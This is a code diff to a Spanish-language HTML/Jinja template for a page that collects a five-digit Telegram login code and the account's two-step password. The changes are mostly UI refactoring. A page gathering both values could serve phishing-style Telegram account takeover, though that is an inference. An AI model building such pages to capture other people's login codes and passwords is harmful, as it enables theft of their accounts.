@@ -21,6 +21,7 @@
         }
         h1 {
             color: #333;
+            margin-bottom: 20px;
         }
         .code-inputs {
             display: flex;
@@ -40,23 +41,31 @@
             border-color: #007bff;
             outline: none;
         }
-        button {
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .btn {
             padding: 12px 20px;
-            background-color: #007bff;
             color: white;
             border: none;
             border-radius: 4px;
             font-size: 16px;
             cursor: pointer;
-            margin: 5px;
+            transition: background-color 0.3s;
         }
-        button:hover {
+        .btn-primary {
+            background-color: #007bff;
+        }
+        .btn-primary:hover {
             background-color: #0069d9;
         }
-        .resend-btn {
+        .btn-secondary {
             background-color: #6c757d;
         }
-        .resend-btn:hover {
+        .btn-secondary:hover {
             background-color: #5a6268;
         }
         .error {
@@ -90,6 +99,11 @@
             border-radius: 4px;
             font-size: 16px;
         }
+        .form-note {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #6c757d;
+        }
     </style>
 </head>
 <body>
@@ -107,7 +121,7 @@
         <div class="success">{{ success }}</div>
         {% endif %}
         
-        <form method="POST" action="/verify">
+        <form method="POST" action="/verify" id="verification-form">
             <!-- Sección de código normal -->
             <div id="code-section" {% if requires_2fa %}style="display:none;"{% endif %}>
                 <div class="code-inputs">
@@ -120,15 +134,26 @@
                 
                 <input type="hidden" name="verification_code" id="verification_code">
                 
-                <button type="submit">Verificar Código</button>
-                <button type="button" class="resend-btn" onclick="resendCode()">Reenviar Código</button>
+                <div class="form-note">
+                    El código de 5 dígitos fue enviado por Telegram
+                </div>
             </div>
             
             <!-- Sección de 2FA -->
             <div id="password-section" class="password-section" {% if requires_2fa %}style="display:block;"{% endif %}>
                 <p>Tu cuenta requiere verificación en dos pasos. Ingresa tu contraseña:</p>
                 <input type="password" name="password" class="password-input" placeholder="Contraseña 2FA" required>
-                <button type="submit">Verificar Contraseña</button>
+            </div>
+            
+            <div class="btn-container">
+                <button type="submit" class="btn btn-primary" id="submit-btn">
+                    {% if requires_2fa %}Verificar Contraseña{% else %}Verificar Código{% endif %}
+                </button>
+                {% if not requires_2fa %}
+                <button type="submit" name="resend" value="true" class="btn btn-secondary">
+                    Reenviar Código
+                </button>
+                {% endif %}
             </div>
         </form>
         
@@ -139,15 +164,18 @@
         // Combinar los 5 campos en un solo código
         const codeInputs = document.querySelectorAll('.code-input');
         const verificationInput = document.getElementById('verification_code');
+        const form = document.getElementById('verification-form');
+        
+        function updateVerificationCode() {
+            verificationInput.value = Array.from(codeInputs).map(i => i.value).join('');
+        }
         
         codeInputs.forEach((input, index) => {
             input.addEventListener('input', () => {
                 if (input.value.length === 1 && index < 4) {
                     codeInputs[index + 1].focus();
                 }
-                
-                // Actualizar el campo oculto
-                verificationInput.value = Array.from(codeInputs).map(i => i.value).join('');
+                updateVerificationCode();
             });
             
             input.addEventListener('keydown', (e) => {
@@ -157,21 +185,8 @@
             });
         });
         
-        // Manejar reenvío de código
-        function resendCode() {
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = '/verify';
-            
-            const input = document.createElement('input');
-            input.type = 'hidden';
-            input.name = 'resend';
-            input.value = 'true';
-            
-            form.appendChild(input);
-            document.body.appendChild(form);
-            form.submit();
-        }
+        // Actualizar código oculto al cargar
+        updateVerificationCode();
         
         // Contador regresivo
         let timeLeft = 300; // 5 minutos en segundos
@@ -187,6 +202,7 @@
                 setTimeout(updateCountdown, 1000);
             } else {
                 countdownElement.textContent = '¡El código ha expirado!';
+                form.submit(); // Enviar automáticamente para recargar
             }
         }
         
@@ -196,7 +212,28 @@
         {% if requires_2fa %}
             document.getElementById('code-section').style.display = 'none';
             document.getElementById('password-section').style.display = 'block';
+            document.getElementById('submit-btn').textContent = 'Verificar Contraseña';
         {% endif %}
+        
+        // Prevenir envío doble
+        let isSubmitting = false;
+        form.addEventListener('submit', (e) => {
+            if (isSubmitting) {
+                e.preventDefault();
+                return;
+            }
+            
+            isSubmitting = true;
+            const submitBtn = document.getElementById('submit-btn');
+            submitBtn.disabled = true;
+            submitBtn.textContent = 'Procesando...';
+            submitBtn.style.opacity = '0.7';
+            
+            // Actualizar código antes de enviar
+            if (!{% if requires_2fa %}true{% else %}false{% endif %}) {
+                updateVerificationCode();
+            }
+        });
     </script>
 </body>
 </html>
